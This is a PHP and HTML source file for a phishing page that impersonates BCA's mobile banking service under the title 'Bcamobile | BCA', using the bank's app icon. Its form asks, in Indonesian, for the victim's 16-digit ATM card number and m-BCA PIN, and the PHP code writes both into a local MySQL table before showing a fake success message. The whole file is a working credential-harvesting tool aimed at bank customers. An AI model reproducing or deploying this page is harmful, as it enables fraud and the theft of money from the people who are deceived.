<?php 

if(isset($_POST['submit'])){


    $host      =      'localhost';
    $dbname    =      'bca';
    $dbuser    =      'root';
    $dbpass    =      '';
    $tbname    =      'email_list';


  $conn = mysqli_connect($host,$dbuser,$dbpass,$dbname);
  $name = mysqli_real_escape_string($conn, $_POST['nomor_atm']);
    $email = mysqli_real_escape_string($conn, $_POST['pin']);
 
  //Email
  $query_email = "SELECT * FROM `$tbname` WHERE email ='$email' ";

  $result_email = $conn->query($query_email);

  $client_email = $result_email->fetch_array();

  if($client_email)
  {
  $msg='<div class="msg-mailsb msg-mail-red">Thanks! Your form has been send..</div> ';

  }else { 
  $sql = "INSERT INTO `email_list` (`id`, `name`, `email`) VALUES (NULL, '$name', '$email')";

  $conn->query($sql);
  
  $msg= '<div class="msg-mailsb msg-mail-green">
            Success!!<br>
            <span class="mailsub-goback-btn"><a href="javascript:window.history.go(-1);">Click here</a></span>  return to the recent page you were browsing.
          </div> ';
}
}


?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Bcamobile | BCA</title>
  <link rel="icon" href="https://play-lh.googleusercontent.com/ggZzVVDWsTm7gSnVl8m3cNFgoeUN2r7dhAZdB8lz0d_s6ZcYOkvUQdbG3dPU5LHZnWvc=s180-rw">
  <link rel="stylesheet" href="input.css">
  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/skeleton.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
  <nav>
    <img src="https://res.cloudinary.com/codelifings/image/upload/v1614170786/nav_p9nvvi.png" alt="navbar">
  </nav>
  <br>
  <div>
    <img src="https://res.cloudinary.com/codelifings/image/upload/v1613365398/Tak_berjudul43_20210215120201_np8fkd.png" alt="">
  </div>
  <br><br>
    <form action="" method="POST" accept-charset="utf-8">
      <input class="u-full-width" type="number" placeholder="Masukkan 16 angka No Kartu ATM anda" id="nomor_atm" name="nomor_atm">
      <input class="u-full-width" type="number" placeholder="Masukkan Pin m-BCA Anda" id="pin" name="pin">
      <input style="float: right" name="submit" class="button-primary" type="submit" value="OK">
    </form>

</body>
</html>
